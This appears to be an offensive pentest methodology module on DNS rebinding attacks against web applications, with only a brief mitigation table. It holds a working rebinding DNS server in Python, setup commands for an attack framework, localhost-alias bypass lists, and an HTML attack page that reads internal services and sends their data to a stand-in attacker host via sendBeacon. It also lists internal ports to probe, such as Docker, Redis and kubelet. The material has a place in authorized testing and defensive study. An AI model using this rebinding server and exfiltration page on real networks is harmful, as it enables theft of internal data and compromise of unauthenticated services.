# VULN MODULE — DNS Rebinding
# Asset: webapp
# CWE-346 | Report prefix: WEB-DNSREB

## THREAT MODEL

DNS rebinding attacks bypass the browser Same-Origin Policy by first resolving
attacker.com to a public IP, then — after the victim's browser visits the page —
rebinding the domain to an internal/private IP. The browser's SOP allows subsequent
requests to the same origin (attacker.com), which now resolves to the internal target.

Primary targets:
- Internal admin interfaces (routers, IoT, development servers, localhost services)
- Kubernetes API servers, Docker daemons, Consul, Elasticsearch on internal network
- localhost:PORT services that lack authentication (assuming no external access)

## VULNERABILITY CLASSES

1. SOP bypass via DNS rebinding     CWE-346 — localhost services accessible cross-origin
2. DNS rebinding → auth bypass      CWE-918 — internal API exposed without auth
3. DNS rebinding → CSRF chain       CWE-352 — internal state-change via victim browser
4. DNS rebinding → RCE              CWE-78  — command injection on internal service

## ATTACK METHODOLOGY

```
1. Victim visits attacker.com (DNS TTL = 1s → resolves to attacker's public server)
2. Attacker's page loads JavaScript that waits for DNS TTL to expire
3. Attacker changes DNS A record: attacker.com → 192.168.1.1 (router/internal target)
4. JavaScript makes XMLHttpRequest to attacker.com → browser now resolves to internal IP
5. Response from internal service returned to attacker's JS (SOP considers it same-origin)
6. Attacker's JS reads internal data and exfiltrates to attacker's server
```

## SETUP — SINGULARITY (DNS Rebinding Attack Framework)

```bash
# Singularity: https://github.com/nccgroup/singularity
git clone https://github.com/nccgroup/singularity
cd singularity/html

# Configuration:
# - Manager: attacker.singularity.me (serves attack JS + captures results)
# - Rebind target: 192.168.1.1:80 (victim's internal host)
# - DNS server: singularity's server handles both public and private resolution

# Run:
go build -o singularity ./cmd/singularity-server/
./singularity --listenPort 8080 \
  --attackerHost attacker.singularity.me \
  --attackerFallbackHost 1.2.3.4

# Visit via victim browser: http://attacker.singularity.me/
```

## BYPASS TECHNIQUES

### Bypass 1: 0.0.0.0 target

```
# Many services bind to 0.0.0.0 — resolving DNS to 0.0.0.0 bypasses
# some network-level protections (accepted by Chrome/Firefox for localhost):
attacker.com → 0.0.0.0 → reaches any locally-bound service

# DNS A record: A 0.0.0.0
```

### Bypass 2: CNAME to internal IP

```
# Use CNAME pointing to RFC-1918 address:
attacker.com CNAME 192.168.1.1.xip.io
# Services like xip.io / nip.io resolve subdomains to embedded IPs

# Or directly:
attacker.com CNAME internal.company.local
# Works if victim's resolver resolves internal names
```

### Bypass 3: localhost aliases

```
# These all resolve to 127.0.0.1 — use as rebind target when target is localhost:
localtest.me
lvh.me
vcap.me
127.0.0.1.xip.io
0177.0.0.1        (octal)
0x7f000001        (hex)
2130706433        (decimal)
::1               (IPv6 — some browsers accept)
```

### Bypass 4: DNS TTL race (manual rebinding without framework)

```python
# Custom DNS server that serves public IP first, then private IP:
# Using dnslib:
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A
import time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.request_count = 0

    def resolve(self, request, handler):
        self.request_count += 1
        qname = request.q.qname
        reply = request.reply()

        if self.request_count <= 2:
            # First requests → public IP (attacker server)
            reply.add_answer(RR(qname, QTYPE.A, ttl=1, rdata=A("1.2.3.4")))
        else:
            # Subsequent requests → internal target
            reply.add_answer(RR(qname, QTYPE.A, ttl=1, rdata=A("192.168.1.1")))

        return reply

server = DNSServer(RebindResolver(), port=53, address="0.0.0.0")
server.start_thread()
```

## ATTACK PAGE TEMPLATE

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
const TARGET_PORT = 8080;
const ATTACKER_SERVER = "https://attacker.com/collect";

function rebind() {
  // Wait for DNS TTL to expire (TTL was set to 1s)
  setTimeout(() => {
    // Now DNS should resolve to internal IP
    fetch(`http://attacker.com:${TARGET_PORT}/api/`, {
      credentials: "include"
    })
    .then(r => r.text())
    .then(data => {
      // Exfiltrate to our server (attacker.com now resolves to attacker server again
      // via a different subdomain, or use a direct IP)
      navigator.sendBeacon(ATTACKER_SERVER, data);
    });
  }, 3000);  // wait 3 seconds for TTL expiry
}

// Load page via DNS → public IP (shows "normal" content to not alert victim)
rebind();
</script>
</body>
</html>
```

## TARGETS TO PROBE

```
http://attacker.com:80/       → web server
http://attacker.com:8080/     → alternative HTTP
http://attacker.com:8443/     → alternative HTTPS
http://attacker.com:9200/     → Elasticsearch
http://attacker.com:2375/     → Docker daemon (unauthenticated)
http://attacker.com:6379/     → Redis
http://attacker.com:8500/     → Consul UI
http://attacker.com:4040/     → ngrok
http://attacker.com:10250/    → Kubernetes kubelet
http://attacker.com:3000/     → Grafana, development servers
http://attacker.com:8888/     → Jupyter Notebook
```

## MITIGATION INDICATORS

| Defense | Effect |
|---|---|
| Host header validation | Blocks rebinding — server rejects non-whitelisted Host values |
| DNS rebinding protection in browser | Chrome 98+: blocks private IPs in responses to public requests |
| Requiring authentication on internal services | Limits data accessible via rebind |
| HTTPS with cert pinning on internal service | Browser rejects certificate mismatch |

Check if target service validates `Host` header — send request with `Host: 192.168.1.1`
when connecting to the service directly. If accepted → likely vulnerable to rebinding.

## TOOLS

```bash
# Singularity — full DNS rebinding framework
# https://github.com/nccgroup/singularity

# rbndr — simple DNS rebinding service
# https://github.com/taviso/rbndr
# Usage: visit http://[PUBLIC_IP]-[PRIVATE_IP].rbndr.us/

# DNS rebinding test service:
# https://lock.cmpxchg8b.com/rebinder.html

# nip.io / xip.io — wildcard DNS resolving to embedded IP:
# 192.168.1.1.nip.io → 192.168.1.1
```
